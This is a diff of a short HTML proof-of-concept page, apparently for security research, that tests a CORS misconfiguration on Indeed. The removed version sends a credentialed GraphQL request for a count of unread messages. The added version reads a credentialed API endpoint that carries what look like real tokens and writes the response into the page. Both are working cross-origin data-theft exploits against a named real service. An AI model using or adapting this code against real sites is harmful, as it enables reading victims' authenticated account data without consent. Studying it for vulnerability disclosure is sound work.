@@ -1,39 +1,16 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC</title>
-  </head>
-  <body>
-    <script>
-      fetch("https://apis.indeed.com/graphql", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          operationName: "GetUnreadConversationCount",
-          query: `
-            query GetUnreadConversationCount($input: GetUnreadConversationCountInput!) {
-              getUnreadConversationCount(input: $input) {
-                unreadConversationCount
-              }
-            }
-          `,
-          variables: {
-            input: {
-              conversationFilter: {
-                excludedLabels: ["JS_MSG_FOLDER/ARCHIVE", "JS_MSG_FOLDER/SPAM"]
-              }
-            }
-          }
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        document.body.innerHTML = "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
-      })
-      .catch(e => console.error("Fetch error:", e));
-    </script>
-  </body>
+<body>
+<h2>CORS PoC</h2>
+<script>
+fetch("https://apply.indeed.com/api/v1/env?tk=1jfihgbe3h85r86g&vjtk=1jfihgbl8h85r800&rojc=745be885a4582e03&ctk=1j97tbqc4gc1h800&jk=6d9abd6d7d48cc3c", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  document.body.innerHTML += "<pre>" + data + "</pre>";
+})
+.catch(e => console.error(e));
+</script>
+</body>
 </html>
